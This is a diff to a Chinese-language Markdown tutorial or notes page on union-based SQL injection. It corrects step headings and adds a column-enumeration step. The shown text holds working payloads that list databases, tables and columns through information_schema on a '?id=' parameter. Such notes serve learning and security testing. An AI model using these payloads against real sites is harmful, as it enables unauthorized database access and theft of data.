@@ -95,16 +95,22 @@ version\(\) - 数据库版本号。
 ?id = -999 union select 1,2,3,4,5    // 通过二分法确认长度
 ```
 
-**确认所有表**
+**确认所有库**
 
 ```
 ?id = -999 union select 1,2,3,4,group_concat(distinct(table_schema)) from information_schema.tables
 ```
 
-**确认某表所有列**
+**确认所有表**
 
 ```
 ?id = -999 union select 1,2,3,4,group_concat(distinct(table_name)) from information_schema.tables where table_schema=database();
+```
+
+**确认某表所有列**
+
+```
+?id = -999 union select 1,2,3,4,group_concat(distinct(column_name)) from information_schema.columns where table_name="table";
 ```
 
 **提取数据**
